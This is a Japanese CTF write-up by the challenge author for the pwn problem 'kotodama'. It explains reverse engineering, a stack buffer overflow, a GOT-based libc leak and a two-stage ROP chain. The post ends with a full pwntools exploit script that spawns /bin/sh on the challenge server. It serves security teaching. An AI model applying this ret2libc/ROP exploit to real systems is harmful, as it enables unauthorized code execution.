---
title: "【SECCON】RWPL SubContent - [Pwn] kotodama"
emoji: "🔥"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [CTF, pwn, Security, gdb]
published: true
---

# はじめに
2025/3/1に実施した[SECCON 13 電脳会議](https://www.seccon.jp/13/ep250301.html)のRWPL WorkShop（サブコンテンツ）で提供したPwn問題「kotodama」の作問者WriteUpです。

問題については以下のリポジトリにて公開しています
https://github.com/schecthellraiser606/create_ctf/tree/main/2026/kotodama

RWPLについては以下のHPを参照してみてください。
https://rwpl.github.io/

# 環境準備
## Toolsのインストール
お好きなx86のLinuxディストリビューション（筆者はkali linux）を用意して以下のToolをインストールしてください。

- gdb
- Python3
- [pwntools](https://github.com/Gallopsled/pwntools)
- [pwndbg](https://github.com/pwndbg/pwndbg)
- docker
- Ghidra
  - ※お好きなツールでいいと思いますが、今回はGhidraを使用して解説していきます
  - ※kaliだと`apt install ghidra`でインストールできます
- [ropper](https://github.com/sashs/Ropper)
  - ※[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)とかでもいいです
  - ※本記事ではropperを使用して解説していきます
  - ※kaliだと`apt install ropper`でインストールできます

## 問題環境の構築
GitHubから問題ファイルをダウンロードして、`build.sh`で起動できます（Dockerコンテナ環境で動いています）。

`nc localhost 1337`を実行し、以下のようなメッセージが表示されれば問題サーバが起動しています。

![1](/images/kotodama/1.png)

# kotodama
実際に問題を解いていきます。
提供されている問題に関するバイナリファイルは以下の通りです。これらをみていきます。
- chall
- libc.so.6（v2.36）

## リバースエンジニアリング
ソースコードは提供されていないので、リバースエンジニアリングしていきます。
Ghidraを使用して、`chall`を解析していきます。

`ghidra`コマンドを実行すると以下の様な画面が表示されるので、「New Project」を選択して新しいプロジェクトを作成し、バイナリをインポートします。

![2](/images/kotodama/2.png)

![3](/images/kotodama/3.png)

![4](/images/kotodama/4.png)

CodeBrowserが表示されるのでAnalyzeを実行しましょう。基本的にバイナリのリバースエンジニアリングはこの画面で行っていきます。

![5](/images/kotodama/5.png)

まず、このバイナリのシンボルを確認すると、`main`関数のシンボルや、気になる関数のシンボルが表示されています。

![6](/images/kotodama/6.png)

`main`関数や、`vuln`関数を見てみると、以下の様なコードが表示されます。

![7](/images/kotodama/7.png)

![8](/images/kotodama/8.png)

`puts`で先ほどの「Enter your KOTODAMA:」などが見えるのでこの辺りがユーザからの入力を受け取る部分だとわかります。

具体的には`local_78`のポインタに`0x100`バイト分の入力を`read`関数で読み取って渡してます。適当に入力してみます。

![9](/images/kotodama/9.png)

同じ様な出力が並んでいますが、これは以下の関数でXOR演算されているからでしょう。

![10](/images/kotodama/10.png)

`0x41`以降のバイトが並んでいるので、おそらくASCII範囲の文字と予想します。byteだと見にくそうなので`char`に「Retype Variable」で変換してみます。

![11](/images/kotodama/11.png)

![12](/images/kotodama/12.png)

![13](/images/kotodama/13.png)

`KOTODAMA`で各文字をXORしていることがわかります。ざっくりこのコードの動作が把握できたかなと思います。vulnの中の各種変数をリネームしておいたのが以下です。

![14](/images/kotodama/14.png)

ここで気になるのは`read`で0x100バイトを受け入れているのにデフォルトでXORを行うのが100（`0x64`）バイト分しかないことです。アセンブリの最初を見てみると以下の様に`sub rsp, 0x70`と`0x70`バイトしかスタックを確保していないことがわかります。これはバッファオーバーフローの脆弱性があるのではないかと予想できます。

![15](/images/kotodama/15.png)

ここまでで一旦Ghidraでのリバースエンジニアリングは終了して、次は実際にデバッグしてみましょう。

## 動的デバッグ
`pwndbg`を使用して、実際にデバッグしてみます。`pwndbg`はgdbの拡張ツールで、gdbをより便利に使えるようにするツールです。
`gdbinit`fileに以下の設定を追加しておくと便利です。
```bash
# gdbinitにpwndbgをインストールしたディレクトリのgdbinit.pyを読み込む
source /[to_path_pwndbg]/pwndbg/gdbinit.py
```
以下のコマンドで`chall`を動かします。
```bash
gdb ./chall
```
次に`checksec`でバイナリのセキュリティ機構を確認します。
セキュリティ機構の各項目がどのようなものなのかは以下のリンクを参照してください。
https://miso-24.hatenablog.com/entry/2019/10/16/021321

確認した結果は以下です。

![16](/images/kotodama/16.png)

`NX enabled`になっているので、スタックにシェルコードを置いて実行はできなさそうですね。ROPを利用することが必要そうです。

### ROP chainとは
ROP chainとは、Return Oriented Programmingの略で、攻撃者が用意したコードを実行するために、既存のコードの一部を利用して攻撃する手法です。攻撃者は、既存のコードの中から、特定の機能を持つコードの断片（gadgets）を見つけ出し、それらを組み合わせて攻撃コードを構築します。

ROP chainを構築する前に基本的なIntel x64のLinuxバイナリにおける関数の呼び出し方を理解しておく必要があります。以下の表は、関数呼び出しにおいて、引数がどのCPUレジスタに渡されるかを示しています。

| 引数の順番 | レジスタ |
| --- | --- |
| 1番目 | rdi |
| 2番目 | rsi |
| 3番目 | rdx |
| 4番目 | rcx |
| 5番目 | r8 |
| 6番目 | r9 |

第七引数以降はスタックに渡されます。また、関数が呼び出された後、戻り値はraxレジスタに格納されます。
大体これくらいの知識があれば、ROP chainを構築できます。

どういったやり方があるかは実際にStackに積まれるリターンアドレスの汚染方法を見ながら考えたほうが分かりやすいと思うので図示します。

```
┌───────────────────────────────┐
│ return to: pop rdi ; ret      │  ← RIPが最初にここへ
├───────────────────────────────┤
│ arg1 (for RDI)                │
├───────────────────────────────┤
│ return to: pop rsi ; ret      │
├───────────────────────────────┤
│ arg2 (for RSI)                │
├───────────────────────────────┤
│ return to: pop rdx ; ret      │
├───────────────────────────────┤
│ arg3 (for RDX)                │
├───────────────────────────────┤
│ return to: call_target_addr   │  ← 最後に実行したい関数/アドレス
└───────────────────────────────┘
```

これによって以下の様な動作となります。

- 最初にバッファオーバーフローで制御できる`ret`から、`pop rdi; ret`のaddressへ移る
- `pop rdi`がスタック先頭の値を取り出し、`RDI = arg1`になる
- 続く`ret`で、次の`pop rsi; ret`のaddressへ移る
- `pop rsi`が次の値を取り出し、`RSI = arg2`になる
- 続く`ret`で、次の`pop rdx; ret`のaddressへ移る
- `pop rdx`が次の値を取り出し、`RDX = arg3`になる
- 最後の`ret`で、`call_target_addr`（呼びたい関数アドレス）へジャンプする
- 結果として、`RDI/RSI/RDX`に引数がセット済みの状態でターゲット関数が実行される
  - `call_target(arg1, arg2, arg3)`と同等の動作になる

このように、コードにあるret命令などに続くアドレスを悪用して、レジスタに特定の値を配置することで、任意の関数を任意の引数で呼び出すことができます。これがROP chainの基本的な考え方です。

このROPchainに利用するアドレスをgadgetと呼びます。ROPgadgetやropperなどのツールを利用して、バイナリからgadgetsを探し出すことができます。

### gadgetsの探索
`chall`の中からgadgetsを探してみましょう。以下コマンドで`ropper`を起動します。

![17](/images/kotodama/17.png)

適当に`search`コマンドで`pop rdi`などを探してみます。

![18](/images/kotodama/18.png)

`pop rsi; ret`は見つかりましたが、それ以外はなさそうですね。全てのgadgetsを`gadgets`コマンドで見てみます。

![19](/images/kotodama/19.png)

rdi制御に使えそうなガジェットはぱっと見つからないです。
ここで、Ghidraで見えた`gadget_helper`たちのシンボルを思い出します。このシンボル名だと何かいいガジェットが隠されていそうです。gdbで`disass`コマンドを使って確認してみます。

![20](/images/kotodama/20.png)

お、特徴的な命令そうですね。以下が見つかったアセンブリコードです。

- gadget_helper1
  - `pop rcx; pop rsi; ret;`
- gadget_helper2
  - `movabs rdi, 0x414d41444f544f4b; xor rdi, rcx; mov rax, rsi; test rax, rax; je 0x1173; call rax;`

`rdi`のレジスタはgadget_helper2のaddressでガチャガチャ出来そうな雰囲気がありますね。また、`0x414d41444f544f4b`はASCIIで「KOTODAMA」なのが、リバースエンジニアリング時点でに見えていた定数と同じですね。これも何か意味がありそうです。

`gadget_helper2`のアセンブリを読んでいくと、以下の流れでレジスタが操作されていることがわかります。

- `movabs rdi, 0x414d41444f544f4b`で、`rdi`に「KOTODAMA」の定数が入る
- `xor rdi, rcx`で、`rdi`が`rcx`とXORされる
- `mov rax, rsi`で、`rax`に`rsi`の値が入る
- `test rax, rax`で、`rax`が0かどうかをテストする
- `je 0x1173`で、`rax`が0の場合は`0x1173`(`mov rdi, rbx`)にジャンプする
  - `rax`が0じゃない場合は次のcall命令へ
- `call rax`で、`rax`のアドレスの関数を呼び出す

これらを総合すると、`rcx`と`rsi`を制御すれば、`rdi`を任意の値にして、さらに`rax`に呼びたい関数のアドレスを入れて呼び出すことができそうですね。引数が1つの関数を呼び出すためのガジェットとして利用できそうです。幸いに、この制御はgadget_helper1の`pop rcx; pop rsi; ret;`で行うことができます。

### GOTによるlibcの関数アドレスの特定
ここまでの分析から、以下の様な攻撃の方針が見えてきました。
- バッファオーバーフローでスタックを汚染して、gadget_helper1の`pop rcx; pop rsi; ret;`のaddressへリターンさせる
- `rcx`に「KOTODAMA」とXORする値を入れて、`rsi`に呼びたい関数のアドレスを入れる

ただ、これだけだと何を呼び出せばいいのか見えません。ここからは`No PIE`であることを利用して、GOTからlibcの関数アドレスを特定していきます。

GOTとは、Global Offset Tableの略で、動的リンクされた関数のアドレスを格納するテーブルです。`No PIE`であれば、GOTのアドレスは固定されているので、そこからlibcの関数アドレスを特定できます。

`run`コマンド後に`got`コマンドでGOTの内容を確認してみます。

![21](/images/kotodama/21.png)

一度呼び出された関数のaddressには`libc`の関数アドレスが入っていることがわかります。例えば、`puts`関数などですね。
このGOTの内容を出力するようにROPchainを組んでやれば、libcのaddressが漏洩し、そこから`libc`のベースアドレスを特定することができます。そうすれば、`libc`の中の任意の関数のアドレスも特定できるようになります。

`libc`のベースアドレスさえわかってしまえば、ガジェットが少なかった`chall`を利用しなくても、`libc`の中のガジェットを利用してROPchainを組むことも可能になります。

このGOTアドレスの出力には`puts`関数を利用して出力させればいいですね。以下のイメージです。
```c
puts(puts@got);
```

### 攻撃の方針
ここまでの分析を踏まえると、以下の様な攻撃の方針が見えてきました。
- バッファオーバーフローでスタックを汚染して、gadget_helper1の`pop rcx; pop rsi; ret;`のaddressへリターンさせる
- `rcx`に「KOTODAMA」とXORすることを踏まえて`puts@got ^ 0x414d41444f544f4b`値を入れて、`rsi`に`puts`のsymbolアドレスを入れる
- gadget_helper2のaddressへリターンさせる
- `puts`のGOTにあるlibcのアドレスが出力されるので、libcのベースアドレスを特定する
- 再度バッファオーバーフローを起こすために、最後の`ret`で`vuln`関数のaddressへリターンさせる
- libcのガジェットを利用してROPchainを組んで、`execve("/bin/sh", 0, 0)`などの任意の関数を呼び出す

具体的には以下の様なスタックイメージになります。

```text
# Stage 1: puts(puts@got) でlibcのputsアドレスをリークして、vulnに戻す

┌──────────────────────────────────────────────┐
│ padding offset ... (saved RIPまでの埋め)      │
├──────────────────────────────────────────────┤
│ gadget_helper1                               │  # pop rcx; pop rsi; ret;
├──────────────────────────────────────────────┤
│ rcx = puts@got ^ 0x414d41444f544f4b          │  # (0x414d.. ^ rcx) == puts@got
├──────────────────────────────────────────────┤
│ rsi = puts@symbol                            │  # call先（puts関数）
├──────────────────────────────────────────────┤
│ gadget_helper2                               │  # rdi=0x414d..; rdi^=rcx; rax=rsi; call rax;
├──────────────────────────────────────────────┤
│ vuln                                         │  # リーク後、もう一度入力を取らせる
└──────────────────────────────────────────────┘

# Stage 2: libcガジェットで execve("/bin/sh", 0, 0) を呼ぶ

┌──────────────────────────────────────────────┐
│ padding offset ... (saved RIPまでの埋め)      │
├──────────────────────────────────────────────┤
│ pop rdi ; ret                                │  
├──────────────────────────────────────────────┤
│ rdi = libc_base + "/bin/sh"                  │
├──────────────────────────────────────────────┤
│ pop rsi ; ret                                │
├──────────────────────────────────────────────┤
│ rsi = 0                                      │
├──────────────────────────────────────────────┤
│ pop rdx ; ret                                │
├──────────────────────────────────────────────┤
│ rdx = 0                                      │
├──────────────────────────────────────────────┤
│ RIP = libc_base + execve                     │
└──────────────────────────────────────────────┘
```

## Exploit
### バッファオーバーフローのオフセットの特定
とりあえず、バッファオーバーフローでスタックを汚染するためのオフセットを特定してみましょう。`cyclic`コマンドでユニークなパターンを生成して、どこまでオーバーフローできるか確認します。

```bash
pwndbg> cyclic 0x100
```

![22](/images/kotodama/22.png)

`Segmentation fault`が発生するので、この時点でのret先を確認してみます。

![23-0](/images/kotodama/23-0.png)

続いて、このパターンのoffsetを確認します。

![23](/images/kotodama/23.png)

120バイトでRIPを上書きできることがわかります。

### Stage 1: libcアドレスのリーク
まずは、libcのアドレスをリークするためのROPchainを作ってみましょう。以下はpwntoolsライブラリを使ったPythonで書いたROPchainの例です。
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

rhost = 'localhost'
rport = 1337
offset = 120
exe = ELF("./chall")
libc = ELF("libc.so.6")

rop1 = b"a"*offset
rop1 += pack(0x0000000000401156)
rop1 += pack(exe.got['puts']^0x414d41444f544f4b)
rop1 += pack(exe.sym['puts'])
rop1 += pack(0x000000000040115c)
rop1 += pack(exe.sym['vuln'])

p = remote(rhost, rport)
p.sendlineafter(b'Enter your KOTODAMA:', rop1)
p.recvuntil(b'Your KOTODAMA:\n')
p.recvline()

leak = unpack(p.recvline()[:-1].ljust(8, b'\x00'))
print("leak address: " + hex(leak))

libc.address = leak - libc.symbols.puts
print("libc address: " + hex(libc.address))
```

![24](/images/kotodama/24.png)

libcのputs関数のアドレスがリークでき、そこからlibcのベースアドレスも特定できます。
また、「Enter your KOTODAMA:」のプロンプトが再度送られていることがわかります。これでStage 2のROPchainを送る準備ができました。

### Stage 2: /bin/shの実行
次に、libcのガジェットを利用してROPchainを組んで、`execve("/bin/sh", 0, 0)`を呼び出してみます。
適当に`ropper`などのツールを使って、libcの中から`pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`などのガジェットを探してみましょう。

![25](/images/kotodama/25.png)

以下は、libcのガジェットを利用してROPchainを組んだ例です。
```python
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0x12e766
pop_rsi = libc.address + 0x28f99
pop_rdx = libc.address + 0xfddfd

rop2 = b"a"*offset
rop2 += pack(pop_rdi)
rop2 += pack(binsh)
rop2 += pack(pop_rsi)
rop2 += pack(0)
rop2 += pack(pop_rdx)
rop2 += pack(0)
rop2 += pack(libc.sym['execve'])

p.sendlineafter(b'Enter your KOTODAMA:', rop2)

p.interactive()
```
これを先ほどのPythonスクリプトに追加します。

![26](/images/kotodama/26.png)

これでシェルが起動できていそうですね！`ls`コマンドが通っています。
### 全体のコード
以下が全体のコードになります。
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

rhost = 'localhost'
rport = 1337
offset = 120
exe = ELF("./chall")
libc = ELF("libc.so.6")

rop1 = b"a"*offset
rop1 += pack(0x0000000000401156) # gadget_helper1のaddress
rop1 += pack(exe.got['puts']^0x414d41444f544f4b)
rop1 += pack(exe.sym['puts'])
rop1 += pack(0x000000000040115c) # gadget_helper2のaddress
rop1 += pack(exe.sym['vuln'])

p = remote(rhost, rport)
p.sendlineafter(b'Enter your KOTODAMA:', rop1)
p.recvuntil(b'Your KOTODAMA:\n')
p.recvline()

leak = unpack(p.recvline()[:-1].ljust(8, b'\x00'))
print("leak address: " + hex(leak))

libc.address = leak - libc.symbols.puts
print("libc address: " + hex(libc.address))


binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0x12e766
pop_rsi = libc.address + 0x28f99
pop_rdx = libc.address + 0xfddfd

rop2 = b"a"*offset
rop2 += pack(pop_rdi)
rop2 += pack(binsh)
rop2 += pack(pop_rsi)
rop2 += pack(0)
rop2 += pack(pop_rdx)
rop2 += pack(0)
rop2 += pack(libc.sym['execve'])
p.sendlineafter(b'Enter your KOTODAMA:', rop2)

p.interactive()
```
### 余談
libcのaddressまでわかれば、pwntoolsには勝手にrop組んでくれるモジュールもあるので、そちらを利用してもいいと思います。
```python
rop2 = ROP(libc)

rop2.execv(next(libc.search(b'/bin/sh\x00')), 0)

print("ropdump: ")
print(rop2.dump())

p.sendlineafter(b'Enter your KOTODAMA:', b"a"*offset+rop2.chain())

p.interactive()
```
これで試します。

![27](/images/kotodama/27.png)

できていそうですね。
正直`libc`リークできたらあとは好きなようにしてくださいって感じです！

# おわりに
今回はSECCON 14 電脳会議のRWPL Workshopのサブコンテンツで提供したPwn問題のWriteupを記載しました。
皆さん楽しんで頂けたなら幸いです。
